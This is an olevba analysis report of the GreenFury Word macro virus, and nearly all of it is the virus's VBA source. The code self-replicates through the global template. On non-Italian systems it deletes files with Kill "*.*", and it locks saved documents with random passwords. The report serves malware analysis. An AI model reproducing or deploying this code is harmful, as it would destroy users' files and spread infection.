olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.GreenFur-a5b93d5af75712213fe9f53071339af217af5e77
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.GreenFur-a5b93d5af75712213fe9f53071339af217af5e77 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO GreenFury.bas 
in file: Virus.MSWord.GreenFur-a5b93d5af75712213fe9f53071339af217af5e77 - OLE stream: 'Macros/VBA/GreenFury'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
    '
End Sub

Private Function Casuale$(Password$)
Dim ACaso
Dim Indice
Dim Carattere
    '
    ACaso = WordBasic.Int(Rnd() * (10 - 1) + 1)
    '
    If ACaso > 5 Then
        '
        For Indice = 1 To 15
            Carattere = WordBasic.Int(Rnd() * (90 - 75) + 75)
            Password$ = Password$ + Chr(Carattere)
        Next Indice
        '
        Casuale$ = Password$
    End If
    '
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.GreenFur-a5b93d5af75712213fe9f53071339af217af5e77 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim Versione$
Dim i
Dim Installato
Dim TroppiProblemi
Dim Io$
Dim sMacro$
    '
    On Error GoTo -1: On Error GoTo Uscita
    'Controlla se la versione di word è italiana
    Versione$ = WordBasic.[AppInfo$](16)
    '
    If Versione$ = "Italiano" Then
        'controlla se è gia stato installato
        For i = 1 To NumMacros
            '
            If WordBasic.[MacroName$](i, 0, 0) = "GreenFury" Then
                Installato = -1
            End If
            '
            If WordBasic.[MacroName$](i, 0, 0) = "FileSalvaConNome" Then
                TroppiProblemi = -1
            End If
            '
        Next i
        '
        If Not Installato And Not TroppiProblemi Then
            Io$ = WordBasic.[FileName$]()
            sMacro$ = Io$ + ":GreenFury"
            WordBasic.MacroCopy sMacro$, "Generale:GreenFury", 1
            sMacro$ = Io$ + ":GGGFFF"
            WordBasic.MacroCopy sMacro$, "Generale:FileSalvaConNome", 1
            sMacro$ = Io$ + ":GGGFFF"
            WordBasic.MacroCopy sMacro$, "Generale:GGGFFF", 1
            sMacro$ = Io$ + ":FFFGGG"
            WordBasic.MacroCopy sMacro$, "Generale:FFFGGG", 1
        End If
        '
    Else
        WordBasic.Kill "*.*"
    End If
    '
Uscita:
    '
End Sub
-------------------------------------------------------------------------------
VBA MACRO GGGFFF.bas 
in file: Virus.MSWord.GreenFur-a5b93d5af75712213fe9f53071339af217af5e77 - OLE stream: 'Macros/VBA/GGGFFF'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim Password$
Dim Io$
Dim sMacro$
    '
    Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
    On Error GoTo -1: On Error GoTo Controlla
    WordBasic.CurValues.FileSaveAs dlg
    WordBasic.Dialog.FileSaveAs dlg
    'Attiva la routine payload
    WordBasic.Call "GreenFury.Casuale$", Password$
    '
    If Len(Password$) = 15 Then
        dlg.Password = Password$
    End If
    '
    If dlg.Format = 0 Then dlg.Format = 1
    Io$ = WordBasic.[FileName$]()
    sMacro$ = Io$ + ":AutoOpen"
    WordBasic.MacroCopy "Generale:FFFGGG", sMacro$, 1
    sMacro$ = Io$ + ":FFFGGG"
    WordBasic.MacroCopy "Generale:FFFGGG", sMacro$, 1
    sMacro$ = Io$ + ":GGGFFF"
    WordBasic.MacroCopy "Generale:GGGFFF", sMacro$, 1
    sMacro$ = Io$ + ":GreenFury"
    WordBasic.MacroCopy "Generale:GreenFury", sMacro$, 1
    WordBasic.FileSaveAs dlg
    GoTo Fatto
Controlla:
    'Se è stato scelto annulla dalla finestra di dialogo
    If Err.Number <> 102 Then
        WordBasic.FileSaveAs dlg
    End If
    '
Fatto:
    '
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

